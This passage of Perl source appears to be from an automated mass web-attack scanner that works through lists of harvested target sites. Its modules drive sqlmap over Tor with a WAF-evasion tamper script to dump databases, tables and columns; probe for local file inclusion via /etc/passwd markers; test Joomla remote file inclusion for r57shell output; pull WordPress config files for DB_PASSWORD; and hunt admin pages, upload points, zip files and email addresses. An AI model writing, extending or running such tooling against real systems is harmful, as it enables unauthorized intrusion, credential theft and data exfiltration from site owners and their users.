    if ((!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/xss_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  deleteqexp();
	}
	if (defined $sqlmap) {
      if (-e $Bin.'/xss_scan.txt') { unlink $Bin.'/xss_scan.txt';}
      use File::Copy qw(copy);
	  copy $Bin.'/scan.txt', "$Bin/xss_scan.txt";
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
##bgn SQLMAP 
sub sqlmap {
  ifgettargetlist();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING SQLMAP SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (INFO, $Bin.'/xss_scan.txt');
  while (my $URL = <INFO>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if (index($URL, '%27') != -1) {
	  $URL =~ s/\%27//g;
	}
	if (defined $proxy) {
	  $tor = "--tor --check-tor --tor-type=SOCKS5";
	}else{
	  $tor = "";
	}
	if (defined $p) {
	  $p = "-p $p";
	}else{
	  $p = "";
	}
	print "\033[1;35m";
	timer();
	print "[$count/";
	countsqllist();
	print "]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;33m$URL \n";
	print "\033[1;37m    [+] EXPLOITATION: ";
    print "Sqlmap \n\n";
    print "\033[0;33m[+] Checking databases...\n";
    system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		
	### BEG DATABASE
	DATABASE:; 
    print "\033[0;33m[+] Do You Want To Exploit DATABASE? (Y/n): ";
    $sqldatabase=<STDIN>;
    chomp ($sqldatabase);
	if ($sqldatabase =~ /^[Y]?$/i) {
	  DATABASENAME:;
      print "\033[0;33m[+] Enter DataBase Name: ";
      $databasename=<STDIN>;
      chomp ($databasename);
	  if (!$databasename){ 
        print "\033[0;31m[+] Uppss.. you have to Enter DataBase Name!\n";
        goto DATABASENAME;
      };
      print "\033[0;33m[+] Checking...";
      system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
	  ### END DATABASE
	  ### BEG TABLES
	  TABLESYES:;
      print "\033[0;33m[+] Do You Want To Exploit Tables? (Y/n): ";
      $sqltableyes=<STDIN>;
      chomp ($sqltableyes);
	  if ($sqltableyes =~ /^[Y]?$/i) {
		TABLES:;
        print "\033[0;33m[+] Enter Table Name: ";
         $sqltables=<STDIN>;
        chomp ($sqltables);
	    if (!$sqltables){ 
	      print "\033[0;31m[+] Uppss.. you have to Enter Table Name!\n";
          goto TABLES;
        }
        print "\033[0;33m[+] Checking DataBase Tables...";
        system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		### END TABLES
		### BEG COLUMNS
		COLUMNSYES:;
        print "\033[0;33m[+] Do You Want To Exploit Columns? (Y/n): ";
        $sqlcolyes=<STDIN>;
        chomp ($sqlcolyes);
	    if ($sqlcolyes =~ /^[Y]?$/i) {
		  COLS:;
          print "\033[0;33m[+] Enter Column Name [ex: admin,users,orders]: ";
          $sqlcolumn=<STDIN>;
          chomp ($sqlcolumn);
	      if (!$sqlcolumn){ 
            print "\033[0;31m[+] Uppss.. you have to Enter Column Name!\n";
            goto COLS;
          }
          print "\033[0;33m[+] Checking Columns...";
          system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
	    } ### END COLUMNS
	  }
	}
  }
  close(TEXT);
  print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  if ((!defined $mwpadf) && (!defined $mlfi) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
	subfin();
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## LFI
sub mlfi {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  LFI();
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING LFI SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	foreach $LFI(@LFI){
	  print "\033[1;37m    EXPLR:  ";
	  print "\033[0;37m$LFI \n";
	  $URL =~ s/ //g;
      $yes = 'root:x|bin:x|nologin';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
      
	  if (defined $exploit) {
        $count3=0;
        open (EXP, $Bin.'/exploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[1;36m    ";
	      timer();
	      print "[Exp $count3/";
	      countexploits();
	      print "\033[1;36m]\n";
	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          $URL1 = $URL.$exp.$LFI;
          $URL1 =~ s/ //g;
          checkedurl();
        }
        close (EXP);
      }else{
        $URL1 = $URL.$LFI;
        $URL1 =~ s/ //g;
        checkedurl();
      }
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/lfi_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  deleteqexp();
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## RFI JOOMLA
sub mjoomrfi {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  RFI();
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING JOOMLA RFI SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	foreach $RFI(@RFI){
	  print "\033[1;37m    EXPLR:  ";
	  print "\033[0;37m$RFI \n";
      $URL1 = $URL.$RFI;
	  $URL1 =~ s/ //g;
      $yes = 'r57shell|safe_mode|Executed|Shell';
	  checkedurl();
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/rfi_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  unlink $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## WORDPRESS ADF
sub mwpadf {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  ADFWP();
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING WORDRESS ADF SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	foreach $ADFWP(@ADFWP){
	  print "\033[1;37m    EXPLR:  ";
	  print "\033[0;37m$ADFWP \n";
      $URL1 = $URL.$ADFWP;
	  $URL1 =~ s/ //g;
      $yes = 'DB_NAME|DB_USER|DB_PASSWORD';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/adf_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  unlink $Bin.'/search.txt';
	}
	if (defined $sqlmap) {
      if (-e $Bin.'/xss_scan.txt') { unlink $Bin.'/xss_scan.txt';}
      use File::Copy qw(copy);
	  copy $Bin.'/scan.txt', "$Bin/xss_scan.txt";
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET ADMIN PAGE
sub madmin {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  ADMIN();
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING ADMIN PAGE SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	foreach $ADMIN(@ADMIN){
	  print "\033[1;37m    EXPLR:  ";
	  print "\033[0;37m$ADMIN \n";
      $URL1 = $URL.$ADMIN;
	  $URL1 =~ s/ //g;
      $yes = 'password|username|email|Password|cPanel|admin';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
	  urlstatus();
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/admin_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  unlink $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET SUBDOMAINS
sub msubdomain {
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  testconection();
  SUBDOMAIN();
  if (!defined $mlevel) {
    targetlist();
  	scandetail();
  }
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING SUBDOMAIN SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://www.') != -1) {
	  $URL =~ s/http:\/\/www.//g;
	}
	if (index($URL, 'www.') != -1) {
	  $URL =~ s/www.//g;
	}
	$URL =~ s/\/.*//s;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	foreach $SUBDOMAIN(@SUBDOMAIN){
      $URL1 = $SUBDOMAIN.$URL;
	  $socket=IO::Socket::INET->new(
      PeerAddr=>"$URL1",
      Proto=>'icmp',
      timeout=>1);
	  print "\033[1;37m    EXPLR:  ";
	  print "\033[0;37m$SUBDOMAIN \n";
	  print "\033[1;37m    INFO:   ";
	  if ((defined $socket) && ($socket ne "")) { 
	  	if (defined $beep) {print chr(7);}
	    print "\033[0;32mhttp://$URL1\n";
	    open (INFO, '>>scan.txt');
        print INFO "http://$URL1\n";
        close (INFO);
	  }else{
	    print "\033[0;31mNot a Subdomain! \n";
	  }
	  close $socket if defined $socket;
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/subdomains_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  unlink $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET WORDPRESS SITES
sub mwpsites {
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
  }
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING WORDPRESS SITES SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	foreach $WPCMS(@WPCMS){
      $URL1 = $URL.$WPCMS;
	  $URL1 =~ s/ //g;
	  $cms="Wordpress!";
	  $yes = 'Username|Password|user_login|user_pass|submit|<meta name=\"generator\" content=\"WordPress';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/wp_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  unlink $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET JOOMLA SITES
sub mjoomsites {
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
  }
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING JOOLMA SITES SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	foreach $JOOMCMS(@JOOMCMS){
      $URL1 = $URL.$JOOMCMS;
	  $URL1 =~ s/ //g;
	  $cms="Joomla!";
	  $yes = 'Joomla! Administration Login|Password|User Name|<meta name=\"generator\" content=\"Joomla! - Open Source Content Management|mod-login-password|mod-login-password';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/joom_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  unlink $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET UPLOAD FILES
sub muploadsites {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  UPLOAD();
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING UPLOAD SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	foreach $UPLOAD(@UPLOAD){
	  print "\033[1;37m    EXPLR:  ";
	  print "\033[0;37m$UPLOAD \n";
	  $yes='a';
      $no = 'iikiiiix';
	  if (defined $exploit) {
        $count3=0;
        open (EXP, $Bin.'/exploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[1;36m    ";
	      timer();
	      print "[Exp $count3/";
	      countexploits();
	      print "\033[1;36m]\n";
  	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          $URL1 = $URL.$exp.$UPLOAD;
          $URL1 =~ s/ //g;
          checkedurl();
        }
        close (EXP);
      }else{
        $URL1 = $URL.$UPLOAD;
        $URL1 =~ s/ //g;
        checkedurl();
      }
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/upload_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  deleteqexp();
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET ZIP FILES
sub mzipsites {
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  ZIP();
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING ZIP SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
    foreach $ZIP(@ZIP){
	  print "\033[1;37m    EXPLR:  ";
	  print "\033[0;37m$ZIP \n";
	  $yes='a';
      $no = 'iikiiiix';
	  if (defined $exploit) {
        $count3=0;
        open (EXP, $Bin.'/exploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[1;36m    ";
	      timer();
	      print "[Exp $count3/";
	      countexploits();
	      print "\033[1;36m]\n";
	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          $URL1 = $URL.$exp.$ZIP;
          $URL1 =~ s/ //g;
          checkedurl();
        }
        close (EXP);
      }else{
        $URL1 = $URL.$ZIP;
        $URL1 =~ s/ //g;
        checkedurl();
      }
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/zip_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  deleteqexp();
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET E-MAILS
sub mmails {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  if (-e $Bin.'/scan2.txt') {unlink $Bin.'/scan2.txt';}
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING E-MAILS SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) {$URL = "http://$URL"; };	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
    $yes = '((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})';
    $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	$cmails='';
	if (defined $exploit) {
      $count3=0;
      open (EXP, $Bin.'/exploits.txt');
      while (my $exp = <EXP>) {
	    $count3++;
	    chomp $exp;
        print "\033[1;36m    ";
	    timer();
	    print "[Exp $count3/";
	    countexploits();
	    print "\033[1;36m]\n";
	    print "\033[1;37m    EXPLT:  ";
	    print "\033[0;37m$exp\n";
        $URL1 = $URL.$exp;
        $URL1 =~ s/ //g;
        checkedurl();
      }
      close (EXP);
    }else{
      $URL1 = $URL;
      $URL1 =~ s/ //g;
      checkedurl();
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if ((!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan2.txt';
		$save = "$outdir/mails_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  unlink $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
	unlink $Bin.'/scan2.txt';
	unlink $Bin.'/exploits.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## MD5 ENCODE
sub mmd5 {
  scandetail();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING MD5 GENERATOR...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  print "\033[1;37m    STRING: ";
  print "\033[0;37m$mmd5\n";
  print "\033[1;37m    MD5:    ";
  print '\033[0;32m';
  print Digest::MD5->md5_hex("$mmd5");
  print "\n";
  print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ENCODE BASE 64
sub mencode64 {
  scandetail();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING ENCODE BASE64...\n";
  print "\033[1;37m[ ] ----------------------------------------------------------------------- \n";
  forwait();
  print "\033[1;37m    STRING: ";
  print "\033[0;37m$mencode64\n";
  my $sss=encode_base64($mencode64);
  print "\033[1;37m    ENCODE: ";
  print "\033[0;32m$sss\n";
  print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## DECODE BASE 64
sub mdecode64 {
  scandetail();
  print "\033[1;37m[ ] ----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING DECODE BASE64...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  print "\033[1;37m    STRING: ";
  print "\033[0;37m$mdecode64\n";
  my $rrr=decode_base64($mdecode64);
  print "\033[1;37m    DECODE: ";
  print "\033[0;32m$rrr\n";
  print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BUILD PORTS SCAN INFO
sub resumeportscan {
  if (defined $mports) {
    print "\033[1;37m    INFO:   ";
        if (defined $mbasic) {
	  print "Basic Scan ";
    }
    if (defined $mall) {
      print "Complete Scan ";
    }
    if (defined $muser) {
      print "Select Scan ";
    }
	my $muser=$muser;
	my $mall=$mall;
	if ((defined $mbasic and $mbasic eq "udp") || (defined $mall and $mall eq "udp") || (defined $muser and $muser eq "udp")) {
	  print "UDP ";
	}
	if ((defined $mbasic and $mbasic eq "tcp") || (defined $mall and $mall eq "tcp") || (defined $muser and $muser eq "tcp")) {
	  print "TCP ";
	}
